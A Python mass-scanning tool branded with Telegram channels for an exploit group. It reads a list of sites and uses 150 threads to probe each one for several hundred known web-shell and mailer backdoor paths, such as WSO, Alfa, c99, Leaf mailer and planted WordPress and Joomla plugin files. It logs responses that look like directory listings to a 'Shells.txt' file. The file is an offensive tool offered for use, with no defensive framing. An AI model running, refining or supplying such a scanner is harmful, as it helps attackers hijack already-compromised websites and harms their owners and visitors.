import os os.system('cls' if os.name == 'nt' else 'clear')print(r"""[#] Created by:░██████╗░░█████╗░██╗░░██╗██╗░░░██╗  ███████╗██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗████████╗░██████╗██╔════╝░██╔══██╗██║░██╔╝██║░░░██║  ██╔════╝╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝██╔════╝██║░░██╗░██║░░██║█████═╝░██║░░░██║  █████╗░░░╚███╔╝░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░╚█████╗░██║░░╚██╗██║░░██║██╔═██╗░██║░░░██║  ██╔══╝░░░██╔██╗░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░░╚═══██╗╚██████╔╝╚█████╔╝██║░╚██╗╚██████╔╝  ███████╗██╔╝╚██╗██║░░░░░███████╗╚█████╔╝██║░░░██║░░░██████╔╝░╚═════╝░░╚════╝░╚═╝░░╚═╝░╚═════╝░  ╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░╚═════╝░                               Telegram:   https://t.me/gokuexploits                          TG Channel: https://t.me/gokuexploitss """)
import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
requests.urllib3.disable_warnings()

try:
    if len(sys.argv) > 1:
        target_file_path = sys.argv[1]
    else:
        target_file_path = input("Enter Your Site List >> ")

    with open(target_file_path, mode='r', encoding='utf-8') as file:
        target = [line.strip() for line in file.readlines()]

    def ran(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    Pathlist = [
        '/sts.php',        '/wp-hoard.php',		
        '/wp-l0gin.php', 
        '/priv8.php',
        '/wp-post-editor.php',
        '/404.php',
        '/users.php',
        '/classwithtostring.php',
        '/wp-head.php',
        '/admin.php',
        '/about.php',
        '/dropdown.php',
        '/wp-header.php',
        '/radio.php',
        '/simple.php',
        '/cong.php',
        '/options.php',
        '/wp-content/index.php?x=ooo',
        '/wp-admin/options.php',
        '/wp-content/plugins/fix/up.php',                        '/sts.php',        '/wp-hoard.php',		        '/1index.php',		        '/11index.php',        '/2index.php',        '/3index.php',        '/wp_wrong_datlib.php',        '/wp-adminincludesclass-wp-media-list-data.php',        '/autoload_classmap.php',        '/wso.php',        '/doc.php',        '/stindex.php',        '/alwso.php',        '/ups.php',        '/media-admin.php',        '/sym.php',        '/sym403.php',        '/fw.php',        '/symlink.php',        '/shell.php',        '/1.php',        '/data.php',        '/wp-blog.php',        '/b.php',        '/c.php',        '/shx.php',        '/alfa.php',        '/a.php',        '/old-index.php',        '/FoxWSO.php',        '/x.php',        '/403.php',        '/mini.php',        '/imagesvuln.php',        '/edit-form.php',        '/wikindex.php',        '/m.php',        '/0byte.php',        '/xx.php',        '/new-index.php',        '/wp.php',        '/wp-wso.php',        '/qindex.php',        '/priv8.php',        '/minimo.php',        '/xleet.php',        '/V3.php',        '/V5.php',        '/404.php',        '/up.php',        '/www.php',        '/100.php',        '/777.php',        '/defau1t.php',        '/f.php',        '/xox.php',        '/o.php',        '/new.php',        '/sindex.php',        '/baindex.php',        '/wi.php',        '/mar.php',        '/root.php',        '/nee.php',        '/v.php',        '/z.php',        '/g.php',        '/c99.php',        '/w.php',        '/ws.php',        '/2.php',        '/lol.php',        '/87.php',        '/7yn.php',        '/haxor.php',        '/13.php',        '/e.php',        '/r.php',        '/t.php',        '/y.php',        '/u.php',        '/i.php',        '/p.php',        '/q.php',        '/s.php',        '/d.php',        '/h.php',        '/j.php',        '/k.php',        '/l.php',        '/n.php',        '/xindex.php',        '/kindex.php',        '/FoxWSOv1.php',        '/alf.php',        '/bb.php',        '/lf.php',        '/WSO.php',        '/xxx.php',        '/hello.php',        '/ok.php',        '/if.php',        '/kk.php',        '/mrjn.php',        '/kn.php',        '/3301.php',        '/leaf.php',        '/alex.php',        '/mailer.php',        '/anone.php',        '/wp-configer.php',        '/wp-ad.php',        '/send.php',        '/3.php',        '/.wp-cache.php',        '/sendmail.php',        '/rahma.php',        '/nasgor.php',        '/wp-confirm.php',        '/alfa123.php',        '/upload.php',        '/bypass.php',        '/wp-one.php',        '/alexus.php',        '/wso1337.php',        '/1337.php',        '/blog.php',        '/it.php',        '/kiss.php',        '/0.php',        '/wp2.php',        '/owl.php',        '/vuln.php',        '/ohayo.php',        '/wp-admin.php',        '/cms.php',        '/wp-uploads.php',        '/Gel.php',        '/41.php',        '/4price.php',        '/MARIJUANA.php',        '/marijuana.php',        '/.fk.php',        '/XxX.php',        '/alexuse.php',        '/Sendemail.php',        '/content.php',        '/leafmailer2.8.php',        '/olu.php',        '/alexusmailer 2.0.php',        '/rss.php',        '/alexus-mailer.php',        '/wp-file.php',        '/wso2.php',        '/wso1.php',        '/olux.php',        '/wp-info.php',        '/xl.php',        '/wp-confiig.php',        '/file-manager.php',        '/uploader.php',        '/leafmailer.php',        '/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/.well-known/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/tmp_images/alfacgiapi/perl.alfa.php',        '/wp-admin/alfacgiapi/perl.alfa.php',        '/wp-content/alfacgiapi/perl.alfa.php',        '/wp-includes/alfacgiapi/perl.alfa.php',        '/alfacgiapi/perl.alfa.php',        '/css/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/files/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/images/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/wp-admin/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/wp-content/ALFA_DATA/alfacgiapi/perl.alfa.php',        '/wp-includes/ALFA_DATA/alfacgiapi/perl.alfa',        '/date.php',        '/about.php',        '/alfaindex.php',        '/.alf.php',        '/wp-content/plugins/cekidot/alf.php',        '/wp-content/fw.php',        '/wp-content/alfa.php',        '/snd.php',        '/wp-class.php',        '/small.php',        '/wp-content/plugins/upspy/index.php',        '/wp-content/plugins/ubh/index.php',        '/wp-content/plugins/vwcleanerplugin/bump.php?cache',        '/wp-content/themes/gaukingo/db.php',        '/wp-content/plugins/three-column-screen-layout/db.php',        '/wp-content/plugins/xichang/x.php?xi',        '/wp-content/plugins/html404/index.html',        '/wp-content/plugins/wp-db-ajax-made/wp-ajax.php',        '/Marvins.php',        '/wp-includes/css/modules.php',        '/indoxploit.php',		        '/wp-content/plugins/css-ready-sel/file.php',        '/wp-content/plugins/css-ready/file.php',        '/wp-content/think.php',        '/wp-content/plugins/html404/xccc.php',         '/wp-content/plugins/html404/cry.php.pjpeg',         '//wp-content/plugins/real/v.php',        '/wp-content/plugins/html404/wso25.php',        '/modules/mod_simplefileuploadv1.3/elements/udd.php',        '/libraries/joomla/css.php',        '/libraries/joomla/jmails.php?u',        '/libraries/joomla/jmail.php?u',        '/images/vuln.php',        '/tmp/vuln.php',        '/rxr.php?rxr',        '/modules/modules/modules.php',        '/error.php',        '//wp-content/themes/fitnessbase/404.php?ok',        '//wp-add-admin.php',        '/RxR.php',        '//modules/mod_simplefileuploadv1.3/elements/udd.php',        '/components/com_b2jcontact/izoc.php',        '/administrator/templates/bluestork/error.php',        '/administrator/templates/hathor/index.php',        '/administrator/templates/hathor/error.php',        '/administrator/templates/isis/index.php',        '/administrator/templates/isis/error.php',        '/templates/beez/index.php',        '/templates/ja_purity/index.php',        '/templates/rhuk_milkyway/index.php',        '/templates/+theme+/index.php',        '/templates/+theme+/error.php',        '/templates/beez3/index.php',        '/templates/beez3/error.php',        '/templates/beez5/index.php',        '/templates/beez5/error.php',        '/templates/beez_20/index.php',        '/templates/beez_20/error.php',        '/templates/protostar/index.php',        '/templates/protostar/error.php',        '/templates/atomic/index.php',        '/templates/atomic/error.php',        '/wp-admin/network/wp-footer.php',        '/wp-content/vuln.php',        '/upel.php',        '/wp-content/uploads/',        '/wp-content/uploads/+year+/+month+/',        '/license.php',        '/wp-content/plugins/ppus/up.php',        '/098.php',        '/new_license.php',        '/wp-content/plugins/theme-configurator/mini.php',        '/wp-content/plugins/widget-logic/mini.php',        '/wp-admin/css/index.php',        '/1975.php',        '/1975.php',        '/radio.php',        '/wp-includes/wp-class.php',        '/xleet-shell.php',        '/wp-content/radio.php',        '/wp-includes/radio.php',        '/fx.php',        '/wp-admin/images/atomlib.php',        '/gel4y.php',        '/jindex.php',        '/wp-content/about.php',        '/sh.php',        '/wp-includes/991176.php',        '/wp-admin/maint/about.php',        '/fox.php',        '/wp-admin/x.php',        '/fw.php',        '/server.php',        '/wp-includes/fw.php',        '/4.php',        '/5.php',        '/images/about.php',        '/xmlrpc.php',        '/wp-load.php',        '/wp-login.php',        '/wp-admin/fw.php',        '/mari.php',        '/swm.php',        '/wp-admin/radio.php',        '/wp-includes/about.php',        '/wp-content/wso.php',        '/wp-admin/wso.php',        '/w3llstore.php',        '/wp-content/fx.php',        '/wp-content/x.php',        '/wp-admin/alfa.php',        '/gank.php',        '/style.php',        '/s_e.php',        '/s_ne.php',        '/beence.php',        '/wp-signin.php',        '/moduless.php',        '/export.php',        '/legion.php',        '/system_log.php',        '/shells.php',        '/wp-includes/wp-atom.php',        '/wp-content/plugins/ubh/up.php',        '/wp-content/mu-plugins/db-safe-mode.php',        '/wp-content/db-cache.php',        '/wp-content/plugins/backup_index.php',        '/wp-includes/css/wp-config.php',        '/wp-content/themes/config.bak.php',        '/wp-includes/images/css.php',        '/wp-includes/css/css.php',        '/wp-content/uploads/wp-stream.php',        '/wp-beckup.php',        '/wp-blog-post.php',        '/wp-content/uploads/wp-blockdown.php',        '/wp-admin/includes/class-wp-media-list-data.php',        '/wp-admin/style.php',        '/6.php',        '/7.php',        '/8.php',        '/9.php',        '/10.php',        '/wp_class_datalib.php',        '/wp-includes/wp_class_datlib.php',		        '/wp-includes/pomo/wp_class_datalib.php',        '/01.php',        '/marijuana.php',        '/1xleet.php',        '/wp-content/shell.php',        '/wp-content/fw.php',        '/wp-admin/shell.php',        '/wp-admin/wp.php',        '/4index.php',        '/5index.php',        '/6index.php',        '/7index.php',        '/8index.php',        '/9index.php',        '/Leaf.php',        '/Uploader.php',        '/wp-includes/wp-red.php',        '/.well-known/radio.php',        '/alfashell.php',        '/am.php',        '/blog/fw.php',        '/contacts.php',        '/demo328/fw.php',        '/gif.php',        '/goods.php',        '/images/sym.php',        '/lab.php',        '/leaf_mailer.php',        '/leaf_php.php',        '/libraries/joomla/jmail.php',        '/libraries/joomla/jmails.php',        '/mailer1.php',        '/ms.php',        '/rxr.php',        '/srx.php',        '/tuco.php',        '/unix.php',        '/uploads/up.php',        '/wp-admin/css/colors/coffee/fw.php',        '/wp-admin/css/fw.php',        '/wp-admin/includes/fw.php',        '/wp-admin/maint/fw.php',        '/wp-admin/setup-config.php',        '/wp-content/plugins/vwcleanerplugin/bump.php',        '/wp-content/plugins/xichang/x.php',        '/wp-content/plugins/zedd/1.php',        '/wp-content/up.php',        '/wp-content/wp.php',        '/wp-mna.php',        '/uploads/upload.php',        '/wpx.php',        '/images/c99.php',        '/xhell.php',        '/xmrlpc.php',        '/xz.php',        '/yuuki.php',        '/wp-content/plugins/upspy/index.php',        '/wp-content/plugins/ubh/index.php',        '/wp-content/plugins/vwcleanerplugin/bump.php?cache',        '/wp-content/themes/gaukingo/db.php',        '/wp-content/plugins/three-column-screen-layout/db.php',        '/wp-content/plugins/xichang/x.php?xi',        '/wp-content/plugins/html404/index.html',        '/wp-content/plugins/wp-db-ajax-made/wp-ajax.php',        '/wp-admin/shapes.php',        '/XxX.php',        '/Marvins.php',        '/wp-includes/css/modules.php',        '/olux.php',        '/indoxploit.php',        '/wso.php',        '/wp-content/plugins/css-ready-sel/file.php',        '/wp-content/plugins/css-ready/file.php',        '/wp-content/think.php',        '/wp-content/plugins/upspy/con.php',        '/wp-content/plugins/upspy/up.php',        '/wp-content/plugins/upspy/sllolx.php',        '/database.php',        '/wp-includes/js/tinymce/plugins/compat3x/css/index.php',        '/shell20211028.php',        '/wp-blog.php',        '/repeater.php',        '/wp-includes/wp-class.php',        '/wp-content/themes/seotheme/db.php?u',                
    ]

    class EvaiLCode:
        def __init__(self):
            self.headers = {
                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

        def URLdomain(self, site):
            if site.startswith("http://"):
                site = site.replace("http://", "")
            elif site.startswith("https://"):
                site = site.replace("https://", "")
            else:
                pass
            pattern = re.compile('(.*)/')
            while re.findall(pattern, site):
                sitez = re.findall(pattern, site)
                site = sitez[0]
            return site

        def checker(self, site):
            try:
                url = "http://" + self.URLdomain(site)
                for Path in Pathlist:
                    check = requests.get(url + Path, headers=self.headers, verify=False, timeout=15).content
                    if '-rw-r--r--' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Shells.txt', 'a').write(url + Path + "\n")
                        break
                    else:
                        print('[x] {} --> {}[Not Vuln]'.format(url, fr))  # Corrected the print syntax

            except:
                pass

    Control = EvaiLCode()

    def FlashKiss(site):
        try:
            Control.checker(site)
        except:
            pass

    mp = Pool(150)
    mp.map(FlashKiss, target)
    mp.close()
    mp.join()
    input("Check Shells.txt File")

except Exception as e:
    print(f"An error occurred: {e}")
